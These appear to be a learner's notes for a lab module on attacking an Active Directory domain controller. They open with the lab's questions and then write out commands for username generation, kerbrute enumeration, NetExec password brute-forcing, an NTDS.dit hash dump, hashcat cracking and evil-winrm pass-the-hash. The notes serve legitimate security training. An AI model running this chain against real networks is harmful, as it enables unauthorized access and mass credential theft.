What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: ****.***)

Submit the NT hash associated with the Administrator user from the example output in the section reading.

On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)


Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)

## get list of names and make a txt file with vim

```
bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```

## run it through username-anarchy github project to create usernames out of real names

```
git clone https://github.com/urbanadventurer/username-anarchy
```

```
./username-anarchy -i /home/ltnbob/names.txt 
```

## save the results to a txt file and run it through kerbrute (make kerbrute file too once cloned)

```
git clone https://github.com/ropnop/kerbrute
make all
```
```
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```

## Launching a brute-force attack with NetExec

```
netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

## Using NetExec to capture NTDS.dit
``` 
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```

## Cracking a single hash with Hashcat
```
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

## if we are unsuccessful we can pass the hash to move laterally
```
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```